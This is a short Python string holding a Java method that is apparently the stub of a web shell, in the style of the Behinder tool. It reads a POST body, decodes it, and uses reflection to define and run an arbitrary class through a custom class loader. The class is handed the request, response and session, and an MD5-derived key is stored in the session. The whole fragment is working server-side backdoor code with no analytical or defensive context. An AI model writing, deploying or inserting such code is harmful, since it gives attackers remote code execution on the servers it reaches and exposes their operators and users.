code = """
    private String stub(String payload, Object request, Object response)
            throws Exception {
        if (invokeMethod(request, "getMethod").equals("POST")) {
            payload = (String) invokeMethod(
                    invokeMethod(request, "getReader"),"readLine"
            );
            java.util.HashMap pageContext = new java.util.HashMap();
            Object session = invokeMethod(request, "getSession");
            pageContext.put("request", request);
            pageContext.put("response", response);
            pageContext.put("session", session);
            invokeMethod(session, "putValue",
                'u', hasher(password, "MD5").substring(0, 16));
            byte[] b = decoder(payload);
            Constructor constructor = java.security.SecureClassLoader.class
                .getDeclaredConstructor(ClassLoader.class);
            constructor.setAccessible(true);
            ClassLoader classloader = (ClassLoader) constructor.newInstance(
                new Object[]{this.getClass().getClassLoader()}
            );
            Method defineMethod = ClassLoader.class.getDeclaredMethod(
                "defineClass", byte[].class, int.class, int.class
            );
            defineMethod.setAccessible(true);
            ((Class) defineMethod.invoke(classloader, b, 0, b.length))
                .newInstance().equals(pageContext);
        }
        return null;
    }
"""